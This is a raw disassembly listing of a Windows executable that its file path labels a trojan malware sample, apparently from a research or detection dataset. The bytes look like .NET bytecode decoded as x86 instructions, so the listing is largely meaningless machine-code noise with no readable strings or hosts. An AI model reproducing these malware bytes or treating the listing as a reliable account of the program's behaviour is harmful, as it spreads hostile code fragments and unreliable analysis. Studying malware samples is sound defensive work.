
malware_samples/trojan/f1de64ba6c22c6c873fd7c965ec1e2d70f385ef4ae051be4b8d3d6fc13daf5ae.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	e0 cc                	loopne 0x401fce
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 20 57 00    	add    %al,0x572000
  402013:	00 84 75 00 00 01 00 	add    %al,0x10000(%ebp,%esi,2)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	1a 00                	sbb    (%eax),%al
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 12                	jle    0x402095
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 12 00 00 04    	add    0x4000012(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 13                	jle    0x4020a5
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 14                	jle    0x4020b5
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 15                	jle    0x4020c5
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 16                	jle    0x4020d5
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 17                	jle    0x4020e5
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 18                	jle    0x4020f5
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 19                	jle    0x402105
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1a             	sbb    0x1a(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1a 00 00 04    	add    0x400001a(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1b                	jle    0x40211d
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  40210d:	2a 2a                	sub    (%edx),%ch
  40210f:	02 28                	add    (%eax),%ch
  402111:	3e 00 00             	add    %al,%ds:(%eax)
  402114:	0a 16                	or     (%esi),%dl
  402116:	fe 03                	incb   (%ebx)
  402118:	2a 32                	sub    (%edx),%dh
  40211a:	7e 0b                	jle    0x402127
  40211c:	00 00                	add    %al,(%eax)
  40211e:	04 03                	add    $0x3,%al
  402120:	6f                   	outsl  %ds:(%esi),(%dx)
  402121:	3f                   	aas
  402122:	00 00                	add    %al,(%eax)
  402124:	0a 2a                	or     (%edx),%ch
  402126:	36 28 17             	sub    %dl,%ss:(%edi)
  402129:	00 00                	add    %al,(%eax)
  40212b:	06                   	push   %es
  40212c:	17                   	pop    %ss
  40212d:	58                   	pop    %eax
  40212e:	28 18                	sub    %bl,(%eax)
  402130:	00 00                	add    %al,(%eax)
  402132:	06                   	push   %es
  402133:	2a 2e                	sub    (%esi),%ch
  402135:	73 1a                	jae    0x402151
  402137:	00 00                	add    %al,(%eax)
  402139:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  40213f:	2a 32                	sub    (%edx),%dh
  402141:	7e 1c                	jle    0x40215f
  402143:	00 00                	add    %al,(%eax)
  402145:	04 02                	add    $0x2,%al
  402147:	6f                   	outsl  %ds:(%esi),(%dx)
  402148:	21 00                	and    %eax,(%eax)
  40214a:	00 0a                	add    %cl,(%edx)
  40214c:	2a 32                	sub    (%edx),%dh
  40214e:	7e 1c                	jle    0x40216c
  402150:	00 00                	add    %al,(%eax)
  402152:	04 02                	add    $0x2,%al
  402154:	6f                   	outsl  %ds:(%esi),(%dx)
  402155:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  40215a:	32 02                	xor    (%edx),%al
  40215c:	28 56 00             	sub    %dl,0x0(%esi)
  40215f:	00 0a                	add    %cl,(%edx)
  402161:	28 26                	sub    %ah,(%esi)
  402163:	00 00                	add    %al,(%eax)
  402165:	06                   	push   %es
  402166:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  40216c:	00 01                	add    %al,(%ecx)
  40216e:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  402173:	25 18 02 1e 63       	and    $0x631e0218,%eax
  402178:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  40217f:	63 d2                	arpl   %edx,%edx
  402181:	9c                   	pushf
  402182:	25 16 02 1f 18       	and    $0x181f0216,%eax
  402187:	63 d2                	arpl   %edx,%edx
  402189:	9c                   	pushf
  40218a:	2a 4e 18             	sub    0x18(%esi),%cl
  40218d:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402191:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  402197:	25 16 02 1e 63       	and    $0x631e0216,%eax
  40219c:	d2 9c 2a 32 02 28 57 	rcrb   %cl,0x57280232(%edx,%ebp,1)
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 28                	or     (%eax),%ch
  4021a7:	26 00 00             	add    %al,%es:(%eax)
  4021aa:	06                   	push   %es
  4021ab:	2a 2e                	sub    (%esi),%ch
  4021ad:	73 58                	jae    0x402207
  4021af:	00 00                	add    %al,(%eax)
  4021b1:	0a 80 1c 00 00 04    	or     0x400001c(%eax),%al
  4021b7:	2a 56 02             	sub    0x2(%esi),%dl
  4021ba:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  4021bf:	04 02                	add    $0x2,%al
  4021c1:	28 1a                	sub    %bl,(%edx)
  4021c3:	00 00                	add    %al,(%eax)
  4021c5:	0a 02                	or     (%edx),%al
  4021c7:	03 7d 1d             	add    0x1d(%ebp),%edi
  4021ca:	00 00                	add    %al,(%eax)
  4021cc:	04 2a                	add    $0x2a,%al
  4021ce:	4a                   	dec    %edx
  4021cf:	02 7b 1d             	add    0x1d(%ebx),%bh
  4021d2:	00 00                	add    %al,(%eax)
  4021d4:	04 02                	add    $0x2,%al
  4021d6:	7b 1e                	jnp    0x4021f6
  4021d8:	00 00                	add    %al,(%eax)
  4021da:	04 6f                	add    $0x6f,%al
  4021dc:	59                   	pop    %ecx
  4021dd:	00 00                	add    %al,(%eax)
  4021df:	0a 2a                	or     (%edx),%ch
  4021e1:	8a 02                	mov    (%edx),%al
  4021e3:	02 7b 1e             	add    0x1e(%ebx),%bh
  4021e6:	00 00                	add    %al,(%eax)
  4021e8:	04 17                	add    $0x17,%al
  4021ea:	58                   	pop    %eax
  4021eb:	7d 1e                	jge    0x40220b
  4021ed:	00 00                	add    %al,(%eax)
  4021ef:	04 02                	add    $0x2,%al
  4021f1:	7b 1e                	jnp    0x402211
  4021f3:	00 00                	add    %al,(%eax)
  4021f5:	04 02                	add    $0x2,%al
  4021f7:	7b 1d                	jnp    0x402216
  4021f9:	00 00                	add    %al,(%eax)
  4021fb:	04 6f                	add    $0x6f,%al
  4021fd:	5a                   	pop    %edx
  4021fe:	00 00                	add    %al,(%eax)
  402200:	0a fe                	or     %dh,%bh
  402202:	04 2a                	add    $0x2a,%al
  402204:	22 02                	and    (%edx),%al
  402206:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  40220b:	04 2a                	add    $0x2a,%al
  40220d:	56                   	push   %esi
  40220e:	02 28                	add    (%eax),%ch
  402210:	1a 00                	sbb    (%eax),%al
  402212:	00 0a                	add    %cl,(%edx)
  402214:	02 03                	add    (%ebx),%al
  402216:	7d 20                	jge    0x402238
  402218:	00 00                	add    %al,(%eax)
  40221a:	04 02                	add    $0x2,%al
  40221c:	04 7d                	add    $0x7d,%al
  40221e:	1f                   	pop    %ds
  40221f:	00 00                	add    %al,(%eax)
  402221:	04 2a                	add    $0x2a,%al
  402223:	32 02                	xor    (%edx),%al
  402225:	7b 20                	jnp    0x402247
  402227:	00 00                	add    %al,(%eax)
  402229:	04 6f                	add    $0x6f,%al
  40222b:	3f                   	aas
  40222c:	00 00                	add    %al,(%eax)
  40222e:	06                   	push   %es
  40222f:	2a 4e 02             	sub    0x2(%esi),%cl
  402232:	7b 20                	jnp    0x402254
  402234:	00 00                	add    %al,(%eax)
  402236:	04 6f                	add    $0x6f,%al
  402238:	3f                   	aas
  402239:	00 00                	add    %al,(%eax)
  40223b:	06                   	push   %es
  40223c:	25 03 6f 5a 00       	and    $0x5a6f03,%eax
  402241:	00 06                	add    %al,(%esi)
  402243:	2a 4e 02             	sub    0x2(%esi),%cl
  402246:	7b 20                	jnp    0x402268
  402248:	00 00                	add    %al,(%eax)
  40224a:	04 6f                	add    $0x6f,%al
  40224c:	3f                   	aas
  40224d:	00 00                	add    %al,(%eax)
  40224f:	06                   	push   %es
  402250:	25 03 6f 42 00       	and    $0x426f03,%eax
  402255:	00 06                	add    %al,(%esi)
  402257:	2a 4e 02             	sub    0x2(%esi),%cl
  40225a:	7b 20                	jnp    0x40227c
  40225c:	00 00                	add    %al,(%eax)
  40225e:	04 6f                	add    $0x6f,%al
  402260:	3f                   	aas
  402261:	00 00                	add    %al,(%eax)
  402263:	06                   	push   %es
  402264:	25 03 6f 53 00       	and    $0x536f03,%eax
  402269:	00 06                	add    %al,(%esi)
  40226b:	2a 36                	sub    (%esi),%dh
  40226d:	02 7b 1f             	add    0x1f(%ebx),%bh
  402270:	00 00                	add    %al,(%eax)
  402272:	04 03                	add    $0x3,%al
  402274:	6f                   	outsl  %ds:(%esi),(%dx)
  402275:	59                   	pop    %ecx
  402276:	00 00                	add    %al,(%eax)
  402278:	0a 2a                	or     (%edx),%ch
  40227a:	32 02                	xor    (%edx),%al
  40227c:	7b 1f                	jnp    0x40229d
  40227e:	00 00                	add    %al,(%eax)
  402280:	04 6f                	add    $0x6f,%al
  402282:	5a                   	pop    %edx
  402283:	00 00                	add    %al,(%eax)
  402285:	0a 2a                	or     (%edx),%ch
  402287:	66 02 03             	data16 add (%ebx),%al
  40228a:	7d 21                	jge    0x4022ad
  40228c:	00 00                	add    %al,(%eax)
  40228e:	04 02                	add    $0x2,%al
  402290:	02 7b 21             	add    0x21(%ebx),%bh
  402293:	00 00                	add    %al,(%eax)
  402295:	04 6f                	add    $0x6f,%al
  402297:	5b                   	pop    %ebx
  402298:	00 00                	add    %al,(%eax)
  40229a:	0a 7d 22             	or     0x22(%ebp),%bh
  40229d:	00 00                	add    %al,(%eax)
  40229f:	04 2a                	add    $0x2a,%al
  4022a1:	76 02                	jbe    0x4022a5
  4022a3:	7b 24                	jnp    0x4022c9
  4022a5:	00 00                	add    %al,(%eax)
  4022a7:	04 18                	add    $0x18,%al
  4022a9:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  4022af:	00 06                	add    %al,(%esi)
  4022b1:	02 18                	add    (%eax),%bl
  4022b3:	7d 24                	jge    0x4022d9
  4022b5:	00 00                	add    %al,(%eax)
  4022b7:	04 02                	add    $0x2,%al
  4022b9:	28 3a                	sub    %bh,(%edx)
  4022bb:	00 00                	add    %al,(%eax)
  4022bd:	06                   	push   %es
  4022be:	2a 76 02             	sub    0x2(%esi),%dh
  4022c1:	7b 24                	jnp    0x4022e7
  4022c3:	00 00                	add    %al,(%eax)
  4022c5:	04 19                	add    $0x19,%al
  4022c7:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  4022cd:	00 06                	add    %al,(%esi)
  4022cf:	02 19                	add    (%ecx),%bl
  4022d1:	7d 24                	jge    0x4022f7
  4022d3:	00 00                	add    %al,(%eax)
  4022d5:	04 02                	add    $0x2,%al
  4022d7:	28 3a                	sub    %bh,(%edx)
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	06                   	push   %es
  4022dc:	2a 1e                	sub    (%esi),%bl
  4022de:	02 28                	add    (%eax),%ch
  4022e0:	3e 00 00             	add    %al,%ds:(%eax)
  4022e3:	06                   	push   %es
  4022e4:	2a 52 02             	sub    0x2(%edx),%dl
  4022e7:	03 8c 51 00 00 01 7d 	add    0x7d010000(%ecx,%edx,2),%ecx
  4022ee:	23 00                	and    (%eax),%eax
  4022f0:	00 04 02             	add    %al,(%edx,%eax,1)
  4022f3:	1b 7d 24             	sbb    0x24(%ebp),%edi
  4022f6:	00 00                	add    %al,(%eax)
  4022f8:	04 2a                	add    $0x2a,%al
  4022fa:	52                   	push   %edx
  4022fb:	02 03                	add    (%ebx),%al
  4022fd:	8c 52 00             	mov    %ss,0x0(%edx)
  402300:	00 01                	add    %al,(%ecx)
  402302:	7d 23                	jge    0x402327
  402304:	00 00                	add    %al,(%eax)
  402306:	04 02                	add    $0x2,%al
  402308:	1c 7d                	sbb    $0x7d,%al
  40230a:	24 00                	and    $0x0,%al
  40230c:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40230f:	42                   	inc    %edx
  402310:	02 03                	add    (%ebx),%al
  402312:	7d 23                	jge    0x402337
  402314:	00 00                	add    %al,(%eax)
  402316:	04 02                	add    $0x2,%al
  402318:	1f                   	pop    %ds
  402319:	0b 7d 24             	or     0x24(%ebp),%edi
  40231c:	00 00                	add    %al,(%eax)
  40231e:	04 2a                	add    $0x2a,%al
  402320:	52                   	push   %edx
  402321:	02 28                	add    (%eax),%ch
  402323:	3e 00 00             	add    %al,%ds:(%eax)
  402326:	06                   	push   %es
  402327:	25 03 7d 21 00       	and    $0x217d03,%eax
  40232c:	00 04 04             	add    %al,(%esp,%eax,1)
  40232f:	6f                   	outsl  %ds:(%esi),(%dx)
  402330:	4f                   	dec    %edi
  402331:	00 00                	add    %al,(%eax)
  402333:	06                   	push   %es
  402334:	2a 56 02             	sub    0x2(%esi),%dl
  402337:	28 3e                	sub    %bh,(%esi)
  402339:	00 00                	add    %al,(%eax)
  40233b:	06                   	push   %es
  40233c:	25 03 7d 21 00       	and    $0x217d03,%eax
  402341:	00 04 04             	add    %al,(%esp,%eax,1)
  402344:	6a 6f                	push   $0x6f
  402346:	42                   	inc    %edx
  402347:	00 00                	add    %al,(%eax)
  402349:	06                   	push   %es
  40234a:	2a f6                	sub    %dh,%dh
  40234c:	02 7b 23             	add    0x23(%ebx),%bh
  40234f:	00 00                	add    %al,(%eax)
  402351:	04 2c                	add    $0x2c,%al
  402353:	33 03                	xor    (%ebx),%eax
  402355:	1c 73                	sbb    $0x73,%al
  402357:	77 00                	ja     0x402359
  402359:	00 0a                	add    %cl,(%edx)
  40235b:	25 02 7b 23 00       	and    $0x237b02,%eax
  402360:	00 04 74             	add    %al,(%esp,%esi,2)
  402363:	03 00                	add    (%eax),%eax
  402365:	00 1b                	add    %bl,(%ebx)
  402367:	16                   	push   %ss
  402368:	02 7b 23             	add    0x23(%ebx),%bh
  40236b:	00 00                	add    %al,(%eax)
  40236d:	04 74                	add    $0x74,%al
  40236f:	03 00                	add    (%eax),%eax
  402371:	00 1b                	add    %bl,(%ebx)
  402373:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402376:	4c                   	dec    %esp
  402377:	00 00                	add    %al,(%eax)
  402379:	0a 25 6f 76 00 00    	or     0x766f,%ah
  40237f:	0a 6f 41             	or     0x41(%edi),%ch
  402382:	00 00                	add    %al,(%eax)
  402384:	0a 17                	or     (%edi),%dl
  402386:	2a 16                	sub    (%esi),%dl
  402388:	2a 56 02             	sub    0x2(%esi),%dl
  40238b:	28 39                	sub    %bh,(%ecx)
  40238d:	00 00                	add    %al,(%eax)
  40238f:	06                   	push   %es
  402390:	02 14 7d 23 00 00 04 	add    0x4000023(,%edi,2),%dl
  402397:	02 17                	add    (%edi),%dl
  402399:	7d 24                	jge    0x4023bf
  40239b:	00 00                	add    %al,(%eax)
  40239d:	04 2a                	add    $0x2a,%al
  40239f:	3e 02 03             	add    %ds:(%ebx),%al
  4023a2:	7d 23                	jge    0x4023c7
  4023a4:	00 00                	add    %al,(%eax)
  4023a6:	04 02                	add    $0x2,%al
  4023a8:	1a 7d 24             	sbb    0x24(%ebp),%bh
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	04 2a                	add    $0x2a,%al
  4023af:	6a 02                	push   $0x2
  4023b1:	7b 23                	jnp    0x4023d6
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	04 2d                	add    $0x2d,%al
  4023b7:	06                   	push   %es
  4023b8:	72 6d                	jb     0x402427
  4023ba:	20 00                	and    %al,(%eax)
  4023bc:	70 2a                	jo     0x4023e8
  4023be:	02 7b 23             	add    0x23(%ebx),%bh
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	04 6f                	add    $0x6f,%al
  4023c5:	38 00                	cmp    %al,(%eax)
  4023c7:	00 0a                	add    %cl,(%edx)
  4023c9:	2a 52 02             	sub    0x2(%edx),%dl
  4023cc:	1d 7d 24 00 00       	sbb    $0x247d,%eax
  4023d1:	04 02                	add    $0x2,%al
  4023d3:	03 8c 5e 00 00 01 7d 	add    0x7d010000(%esi,%ebx,2),%ecx
  4023da:	23 00                	and    (%eax),%eax
  4023dc:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4023df:	56                   	push   %esi
  4023e0:	02 1f                	add    (%edi),%bl
  4023e2:	09 7d 24             	or     %edi,0x24(%ebp)
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	04 02                	add    $0x2,%al
  4023e9:	03 8c 54 00 00 01 7d 	add    0x7d010000(%esp,%edx,2),%ecx
  4023f0:	23 00                	and    (%eax),%eax
  4023f2:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4023f5:	52                   	push   %edx
  4023f6:	02 1e                	add    (%esi),%bl
  4023f8:	7d 24                	jge    0x40241e
  4023fa:	00 00                	add    %al,(%eax)
  4023fc:	04 02                	add    $0x2,%al
  4023fe:	03 8c 53 00 00 01 7d 	add    0x7d010000(%ebx,%edx,2),%ecx
  402405:	23 00                	and    (%eax),%eax
  402407:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40240a:	1e                   	push   %ds
  40240b:	02 28                	add    (%eax),%ch
  40240d:	50                   	push   %eax
  40240e:	00 00                	add    %al,(%eax)
  402410:	06                   	push   %es
  402411:	2a 22                	sub    (%edx),%ah
  402413:	02 03                	add    (%ebx),%al
  402415:	28 4f 00             	sub    %cl,0x0(%edi)
  402418:	00 06                	add    %al,(%esi)
  40241a:	2a 1e                	sub    (%esi),%bl
  40241c:	02 28                	add    (%eax),%ch
  40241e:	45                   	inc    %ebp
  40241f:	00 00                	add    %al,(%eax)
  402421:	06                   	push   %es
  402422:	2a 22                	sub    (%edx),%ah
  402424:	02 03                	add    (%ebx),%al
  402426:	28 42 00             	sub    %al,0x0(%edx)
  402429:	00 06                	add    %al,(%esi)
  40242b:	2a 1e                	sub    (%esi),%bl
  40242d:	02 28                	add    (%eax),%ch
  40242f:	46                   	inc    %esi
  402430:	00 00                	add    %al,(%eax)
  402432:	06                   	push   %es
  402433:	2a 22                	sub    (%edx),%ah
  402435:	02 03                	add    (%ebx),%al
  402437:	28 53 00             	sub    %dl,0x0(%ebx)
  40243a:	00 06                	add    %al,(%esi)
  40243c:	2a 1e                	sub    (%esi),%bl
  40243e:	02 7b 24             	add    0x24(%ebx),%bh
  402441:	00 00                	add    %al,(%eax)
  402443:	04 2a                	add    $0x2a,%al
  402445:	32 02                	xor    (%edx),%al
  402447:	7b 26                	jnp    0x40246f
  402449:	00 00                	add    %al,(%eax)
  40244b:	04 73                	add    $0x73,%al
  40244d:	2d 00 00 06 2a       	sub    $0x2a060000,%eax
  402452:	4a                   	dec    %edx
  402453:	02 73 83             	add    -0x7d(%ebx),%dh
  402456:	00 00                	add    %al,(%eax)
  402458:	0a 7d 26             	or     0x26(%ebp),%bh
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 02                	add    $0x2,%al
  40245f:	28 1a                	sub    %bl,(%edx)
  402461:	00 00                	add    %al,(%eax)
  402463:	0a 2a                	or     (%edx),%ch
  402465:	3a 02                	cmp    (%edx),%al
  402467:	6f                   	outsl  %ds:(%esi),(%dx)
  402468:	7a 00                	jp     0x40246a
  40246a:	00 0a                	add    %cl,(%edx)
  40246c:	d2 02                	rolb   %cl,(%edx)
  40246e:	28 65 00             	sub    %ah,0x0(%ebp)
  402471:	00 06                	add    %al,(%esi)
  402473:	2a 32                	sub    (%edx),%dh
  402475:	02 20                	add    (%eax),%ah
  402477:	c0 00 00             	rolb   $0x0,(%eax)
  40247a:	00 6f 62             	add    %ch,0x62(%edi)
  40247d:	00 00                	add    %al,(%eax)
  40247f:	0a 2a                	or     (%edx),%ch
  402481:	6a 02                	push   $0x2
  402483:	20 cb                	and    %cl,%bl
  402485:	00 00                	add    %al,(%eax)
  402487:	00 6f 62             	add    %ch,0x62(%edi)
  40248a:	00 00                	add    %al,(%eax)
  40248c:	0a 02                	or     (%edx),%al
  40248e:	03 28                	add    (%eax),%ebp
  402490:	2a 00                	sub    (%eax),%al
  402492:	00 06                	add    %al,(%esi)
  402494:	16                   	push   %ss
  402495:	1e                   	push   %ds
  402496:	6f                   	outsl  %ds:(%esi),(%dx)
  402497:	4c                   	dec    %esp
  402498:	00 00                	add    %al,(%eax)
  40249a:	0a 2a                	or     (%edx),%ch
  40249c:	7e 02                	jle    0x4024a0
  40249e:	20 ca                	and    %cl,%dl
  4024a0:	00 00                	add    %al,(%eax)
  4024a2:	00 6f 62             	add    %ch,0x62(%edi)
  4024a5:	00 00                	add    %al,(%eax)
  4024a7:	0a 02                	or     (%edx),%al
  4024a9:	03 28                	add    (%eax),%ebp
  4024ab:	71 00                	jno    0x4024ad
  4024ad:	00 0a                	add    %cl,(%edx)
  4024af:	28 26                	sub    %ah,(%esi)
  4024b1:	00 00                	add    %al,(%eax)
  4024b3:	06                   	push   %es
  4024b4:	16                   	push   %ss
  4024b5:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	0a 2a                	or     (%edx),%ch
  4024bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4024bd:	03 2c 0c             	add    (%esp,%ecx,1),%ebp
  4024c0:	02 20                	add    (%eax),%ah
  4024c2:	c3                   	ret
  4024c3:	00 00                	add    %al,(%eax)
  4024c5:	00 6f 62             	add    %ch,0x62(%edi)
  4024c8:	00 00                	add    %al,(%eax)
  4024ca:	0a 2a                	or     (%edx),%ch
  4024cc:	02 20                	add    (%eax),%ah
  4024ce:	c2 00 00             	ret    $0x0
  4024d1:	00 6f 62             	add    %ch,0x62(%edi)
  4024d4:	00 00                	add    %al,(%eax)
  4024d6:	0a 2a                	or     (%edx),%ch
  4024d8:	aa                   	stos   %al,%es:(%edi)
  4024d9:	28 75 00             	sub    %dh,0x0(%ebp)
  4024dc:	00 06                	add    %al,(%esi)
  4024de:	2d 1c 28 76 00       	sub    $0x76281c,%eax
  4024e3:	00 06                	add    %al,(%esi)
  4024e5:	2d 15 28 77 00       	sub    $0x772815,%eax
  4024ea:	00 06                	add    %al,(%esi)
  4024ec:	2d 0e 28 73 00       	sub    $0x73280e,%eax
  4024f1:	00 06                	add    %al,(%esi)
  4024f3:	2d 07 28 74 00       	sub    $0x742807,%eax
  4024f8:	00 06                	add    %al,(%esi)
  4024fa:	2c 06                	sub    $0x6,%al
  4024fc:	14 28                	adc    $0x28,%al
  4024fe:	a9 00 00 0a 2a       	test   $0x2a0a0000,%eax
  402503:	56                   	push   %esi
  402504:	28 d0                	sub    %dl,%al
  402506:	00 00                	add    %al,(%eax)
  402508:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40250b:	00 00                	add    %al,(%eax)
  40250d:	0a 20                	or     (%eax),%ah
  40250f:	20 02                	and    %al,(%edx)
  402511:	00 00                	add    %al,(%eax)
  402513:	6f                   	outsl  %ds:(%esi),(%dx)
  402514:	d2 00                	rolb   %cl,(%eax)
  402516:	00 0a                	add    %cl,(%edx)
  402518:	2a 62 7e             	sub    0x7e(%edx),%ah
  40251b:	39 00                	cmp    %eax,(%eax)
  40251d:	00 04 2c             	add    %al,(%esp,%ebp,1)
  402520:	10 7e 39             	adc    %bh,0x39(%esi)
  402523:	00 00                	add    %al,(%eax)
  402525:	04 6f                	add    $0x6f,%al
  402527:	df 00                	filds  (%eax)
  402529:	00 0a                	add    %cl,(%edx)
  40252b:	14 80                	adc    $0x80,%al
  40252d:	39 00                	cmp    %eax,(%eax)
  40252f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402532:	66 7e 0f             	data16 jle 0x402544
  402535:	00 00                	add    %al,(%eax)
  402537:	04 28                	add    $0x28,%al
  402539:	17                   	pop    %ss
  40253a:	00 00                	add    %al,(%eax)
  40253c:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  40253f:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  402545:	05 28 8b 00 00       	add    $0x8b28,%eax
  40254a:	06                   	push   %es
  40254b:	2a 56 72             	sub    0x72(%esi),%dl
  40254e:	03 26                	add    (%esi),%esp
  402550:	00 70 7e             	add    %dh,0x7e(%eax)
  402553:	10 00                	adc    %al,(%eax)
  402555:	00 04 28             	add    %al,(%eax,%ebp,1)
  402558:	51                   	push   %ecx
  402559:	00 00                	add    %al,(%eax)
  40255b:	0a 80 3a 00 00 04    	or     0x400003a(%eax),%al
  402561:	2a be 73 62 00 00    	sub    0x6273(%esi),%bh
  402567:	06                   	push   %es
  402568:	25 72 81 20 00       	and    $0x208172,%eax
  40256d:	70 6f                	jo     0x4025de
  40256f:	4d                   	dec    %ebp
  402570:	00 00                	add    %al,(%eax)
  402572:	06                   	push   %es
  402573:	72 af                	jb     0x402524
  402575:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  402579:	5a                   	pop    %edx
  40257a:	00 00                	add    %al,(%eax)
  40257c:	06                   	push   %es
  40257d:	6f                   	outsl  %ds:(%esi),(%dx)
  40257e:	57                   	push   %edi
  40257f:	00 00                	add    %al,(%eax)
  402581:	06                   	push   %es
  402582:	28 1e                	sub    %bl,(%esi)
  402584:	00 00                	add    %al,(%eax)
  402586:	06                   	push   %es
  402587:	20 e8                	and    %ch,%al
  402589:	03 00                	add    (%eax),%eax
  40258b:	00 28                	add    %ch,(%eax)
  40258d:	14 00                	adc    $0x0,%al
  40258f:	00 0a                	add    %cl,(%edx)
  402591:	2a da                	sub    %dl,%bl
  402593:	73 62                	jae    0x4025f7
  402595:	00 00                	add    %al,(%eax)
  402597:	06                   	push   %es
  402598:	25 72 81 20 00       	and    $0x208172,%eax
  40259d:	70 6f                	jo     0x40260e
  40259f:	4d                   	dec    %ebp
  4025a0:	00 00                	add    %al,(%eax)
  4025a2:	06                   	push   %es
  4025a3:	72 c1                	jb     0x402566
  4025a5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4025a9:	5a                   	pop    %edx
  4025aa:	00 00                	add    %al,(%eax)
  4025ac:	06                   	push   %es
  4025ad:	25 72 c1 26 00       	and    $0x26c172,%eax
  4025b2:	70 6f                	jo     0x402623
  4025b4:	4d                   	dec    %ebp
  4025b5:	00 00                	add    %al,(%eax)
  4025b7:	06                   	push   %es
  4025b8:	02 6f 5a             	add    0x5a(%edi),%ch
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	6f                   	outsl  %ds:(%esi),(%dx)
  4025bf:	57                   	push   %edi
  4025c0:	00 00                	add    %al,(%eax)
  4025c2:	06                   	push   %es
  4025c3:	28 1e                	sub    %bl,(%esi)
  4025c5:	00 00                	add    %al,(%eax)
  4025c7:	06                   	push   %es
  4025c8:	2a 2e                	sub    (%esi),%ch
  4025ca:	73 83                	jae    0x40254f
